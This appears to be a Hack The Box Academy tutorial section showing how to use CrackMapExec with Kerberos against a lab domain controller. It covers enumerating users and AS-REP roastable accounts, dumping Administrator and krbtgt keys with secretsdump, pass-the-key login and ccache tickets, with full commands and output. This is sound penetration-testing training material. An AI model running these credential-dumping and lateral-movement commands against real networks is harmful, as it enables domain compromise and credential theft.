# Kerberos Authentication

At the time of writing, CrackMapExec supports Kerberos Authentication for the `SMB`, `LDAP`, and `MSSQL` protocols. There are two (2) ways of using Kerberos Authentication:

1. Using the `KRB5CCNAME` env name to specify the `ccache` file. The [Pass the Ticket (PtT) from Linux](https://academy.hackthebox.com/module/147/section/1657) section in the [Password Attacks](https://academy.hackthebox.com/module/details/147) academy module discusses using Kerberos from Linux.
2. Starting in CrackMapExec 5.4.0, we no longer need to use the `KRB5CCNAME` environment variable with a ticket for Kerberos authentication. We can use a username and password or username and hash.

An essential element to consider when using Kerberos authentication in Linux is that the computer we are attacking needs to resolve the FQDN of the domain and the target machine. If we are in an internal network, we can configure our computer to make domain name resolutions to the company's DNS, but this is not the case. We cannot configure the DNS, and we will need to add, manually the FQDN for the domain controller and our target machine in the `/etc/hosts` file.

### **Setting Up the /etc/hosts File**

```shell-session
$ echo -e "\n10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb" | sudo tee -a /etc/hosts

10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

```shell-session
$ cat /etc/hosts

# Host addresses
127.0.0.1  localhost
127.0.1.1  cyberspace
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
10.129.203.121 dc01.inlanefreight.htb dc01 inlanefreight inlanefreight.htb
```

Let's try using CrackMapExec with Kerberos authentication.

***

## Username and Password - Kerberos Authentication

When we use CrackMapExec with a username and password or username and hash without the option `-k` or `--kerberos`, we perform NTLM authentication. We can use Kerberos authentication instead if we use the Kerberos option.

### **Kerberos Authentication**

```shell-session
$ crackmapexec smb 10.129.203.121 -u robert -p Inlanefreight01! --kerberos --shares

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.203.121  445    DC01             [+] Enumerated shares
SMB         10.129.203.121  445    DC01             Share           Permissions     Remark
SMB         10.129.203.121  445    DC01             -----           -----------     ------
SMB         10.129.203.121  445    DC01             ADMIN$          READ            Remote Admin
SMB         10.129.203.121  445    DC01             C$              READ,WRITE      Default share
SMB         10.129.203.121  445    DC01             carlos                          
SMB         10.129.203.121  445    DC01             D$              READ,WRITE      Default share
SMB         10.129.203.121  445    DC01             david                           
SMB         10.129.203.121  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.203.121  445    DC01             IT              READ,WRITE      
SMB         10.129.203.121  445    DC01             john                            
SMB         10.129.203.121  445    DC01             julio                           
SMB         10.129.203.121  445    DC01             linux01         READ,WRITE      
SMB         10.129.203.121  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.203.121  445    DC01             svc_workstations                 
SMB         10.129.203.121  445    DC01             SYSVOL          READ            Logon server share
```

***

## Identifying Users with Kerberos Authentication

With the new Kerberos authentication implementation, CrackMapExec has all the ingredients to build its own [Kerbrute](https://github.com/ropnop/kerbrute) inside CME. This means that CME can tell if a user exists or not on the domain and if this user is configured not to require Kerberos pre-authentication (ASREPRoasting). Let's see this in action with the following accounts: `account_not_exist`, `julio`, and `robert`.

```shell-session
$ crackmapexec smb 10.129.203.121 -u account_not_exist julio robert -p OtherPassword --kerberos

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\account_not_exist: KDC_ERR_C_PRINCIPAL_UNKNOWN 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\julio: KDC_ERR_PREAUTH_FAILED 
SMB         10.129.203.121  445    DC01             [-] inlanefreight.htb\robert account vulnerable to asreproast attack
```

As we can see, we have three different errors, as [Kerbrute](https://github.com/ropnop/kerbrute) CrackMapExec sends TGT requests with no pre-authentication if the KDC responds with a `KDC_ERR_C_PRINCIPAL_UNKNOWN` error, the username does not exist. However, if the KDC prompts for pre-authentication, it will respond with a `KDC_ERR_PREAUTH_FAILED` error, meaning that the username exists. Finally, if we see an error `account vulnerable to asreproast attack`, it's susceptible to AESREPoast attacks, as we previously see in the section [Finding AESREPRoast Accounts](https://academy.hackthebox.com/module/84/section/803).

This does not cause login failures, so it will not lock out any accounts, but it will generate a Windows [event ID 4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) if Kerberos logging is enabled.

***

## Using AES-128 or AES-256

We can also use `AES-128` or `AES-256` hashes for Kerberos Authentication, tools such as [Secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) from [Impacket](https://github.com/SecureAuthCorp/impacket), can usually retrieve those types of hashes. If we use AES-128 or AES-256, our traffic will look more like regular Kerberos traffic, representing an operational advantage (opsec). Let's use Secretsdump and then use the AES256 to authenticate.

### **Authentication with AES256**

```shell-session
$ secretsdump.py 

INLANEFREIGHT.HTB/julio:Password1@10.129.203.121
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xbfb21eeffaaa8abaf5365adf6562a1a4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::

<SNIP>

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f535588e917cf644294519f345f5e14c852d6ae4d9c6fbfefc54be82b84bb35c
Administrator:aes128-cts-hmac-sha1-96:6a1b10171f2f12d7d6fbb31e1823617b
Administrator:des-cbc-md5:b38a08d637d9e06e
krbtgt:aes256-cts-hmac-sha1-96:b67cba3eccadb27d482929f88ace038f9a5b73b6bbc3af93f40575cd6b5fb02c
krbtgt:aes128-cts-hmac-sha1-96:d6a6464fdf51d2bd587366254dcd34e7
krbtgt:des-cbc-md5:73f701bcf4d5d96e
inlanefreight.htb\julio:aes256-cts-hmac-sha1-96:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
inlanefreight.htb\julio:aes128-cts-hmac-sha1-96:ae1b6f722a8857a60c781dd1c12dae4d

<SNIP>
```

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio --aesKey 77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76 (Pwn3d!)
```

***

## CCache file - Kerberos Authentication

A [credential cache (or `ccache`)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) holds Kerberos credentials. They generally remain valid as long as the user’s session lasts, so authenticating to services multiple times (e.g., connecting to a web or mail server more than once) doesn’t require contacting the KDC every time.

In most cases, Linux machines store Kerberos tickets as [ccache files](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html), the way the systems use the tickets is through the environment variable `KRB5CCNAME`, which indicates the path of the ccache file. Let's generate a ticket (ccache file) for the user `robert` and authenticate to `DC01`.

To generate the ticket, we will use the impacket tool [getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py) and set the environment variable `KRB5CCNAME` to the path of the ccache file generated by `getTGT.py`.

### **Ticket Granting Tickets**

```shell-session
$ getTGT.py inlanefreight.htb/robert:'Inlanefreight01!' -dc-ip 10.129.203.121

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[*] Saving ticket in robert.ccache
```

```shell-session
$ export KRB5CCNAME=$(pwd)/robert.ccache
```

To use the environment variable `KRB5CCNAME` as our Kerberos authentication method, we need to use the option `--use-kcache`. The username and password options are not required.

### **Using ccache File as Kerberos Authentication Method (SMB Protocol)**

```shell-session
$ crackmapexec smb 10.129.203.121 --use-kcache

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\robert from ccache
```

### **Using ccache File as Kerberos Authentication Method (LDAP Protocol)**

```shell-session
$ crackmapexec ldap 10.129.203.121 --use-kcache

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        10.129.203.121  389    DC01             [+] inlanefreight.htb\robert from ccache
```

To use Kerberos Authentication with the MSSQL protocol, we need to specify the computer name or FQDN as a target instead of the IP address. This is because, behind the scenes, the `MSSQL` protocol doesn't convert the IP to the FQDN, but the `SMB` and `LDAP` protocols do.
